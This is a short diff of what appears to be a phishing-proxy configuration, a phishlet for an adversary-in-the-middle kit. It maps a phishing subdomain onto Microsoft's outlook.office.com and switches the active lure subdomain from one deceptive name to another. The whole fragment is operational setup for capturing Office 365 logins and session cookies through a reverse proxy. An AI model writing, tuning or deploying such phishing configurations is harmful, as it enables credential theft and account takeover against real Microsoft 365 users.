@@ -335,8 +335,8 @@ proxy_hosts:
     }
   #
   - {
-      phish_sub: "docly.shared-all-access.timber",
-      # phish_sub: "onestep-access-furt97njz",
+      # phish_sub: "docly.shared-all-access.timber",
+      phish_sub: "onestep-access-furt97njz",
       orig_sub: "outlook",
       domain: "office.com",
       session: false,
